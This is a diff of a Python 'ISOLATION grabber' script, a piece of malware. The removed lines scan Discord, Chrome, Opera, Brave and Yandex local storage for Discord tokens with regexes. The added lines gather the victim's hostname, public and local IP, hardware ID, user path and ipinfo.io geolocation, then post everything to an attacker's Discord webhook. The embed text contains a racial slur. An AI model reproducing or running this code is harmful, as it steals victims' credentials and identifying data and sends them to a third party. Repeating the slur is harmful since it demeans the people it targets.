@@ -3,68 +3,54 @@ import discord_webhook
 import json
 import platform
 import socket
-import re
+import subprocess
+import requests
+from urllib.request import urlopen
 # pre-run needed variables
-config = json.dump("CONFIG.json")
+config_file = open("./CONFIG.json","r")
+config = json.load(config_file)
+
 hostname=socket.gethostname()
-IPAddr=socket.gethostbyname(hostname)
+localIPAddr=socket.gethostbyname(hostname)
+IPAddr = requests.get("https://checkip.amazonaws.com")
 local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
 
-paths = {
-    'Discord': roaming + '\\Discord',
-    'Discord Canary': roaming + '\\discordcanary',
-    'Discord PTB': roaming + '\\discordptb',
-    'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
-    'Opera': roaming + '\\Opera Software\\Opera Stable',
-    'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-    'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
-}
-def find_tokens(path):
-    path += '\\Local Storage\\leveldb'
+if platform.system()=="Windows":
+    hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
+else:
+    hwid = subprocess.check_output(['cat', '/etc/machine-id'])
 
-    tokens = []
+pcname = os.path.expanduser("~")
 
-    for file_name in os.listdir(path):
-        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-            continue
-
-        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                for token in re.findall(regex, line):
-                    tokens.append(token)
-    return tokens
-message = ''
-for platform, path in paths.items():
-    if not os.path.exists(path):
-        continue
-    message += f'\n**{platform}**\n```\n'
-    tokens = find_tokens(path)
-    if len(tokens) > 0:
-        for token in tokens:
-            message += f'{token}\n'
-    else:
-        message += 'No tokens found.\n'
-    message += '```'
+data_link = f"https://ipinfo.io/{IPAddr.text[:-2]}/json"
+respons = urlopen(data_link)
+data = json.load(respons)
 # webhook
-embedcont = f'''ISOLATION
+embedcont = f'''
 ---------------------
 get grabbed nigga
 ---------------------
 Operating system >> {platform.system()}
-OS.name >> {os.name}
-HostName >> {hostname}
-Ip Address >> {IPAddr}
-
-
----------------------
-Tokens >>>
-{message}
+OS.name          >> {os.name}
+HostName         >> {hostname}
+pc name          >> {pcname}
+local Ip Address >> {localIPAddr}
+Ip Address       >> {IPAddr.text}HWID             >> {hwid}
+ORG              >> {data["org"]}
+ORG hostname     >> {data["hostname"]}
+City             >> {data["city"]}
+Region           >> {data["region"]}
+Country          >> {data["country"]}
+Location         >> {data["loc"]}
+Postal           >> {data["postal"]}
 '''
 
 def main():
-    webhook = discord_webhook.DiscordWebhook(webhook=config["WEBHOOK"])
-    embed = discord_webhook.DiscordEmbed(title="get grabbed",content=embedcont, color="03b2f8")
+    webhook = discord_webhook.DiscordWebhook(url=str(config["WEBHOOK"]),rate_limit_retry= True)
+    embed = discord_webhook.DiscordEmbed(title="ISOLATION",description=embedcont, color="23272A")
+    embed.set_timestamp()
+    embed.set_footer(text="Grabbed w/ ISOLATION grabber")
     webhook.add_embed(embed=embed)
     webhook.execute()
 if __name__== "__main__":
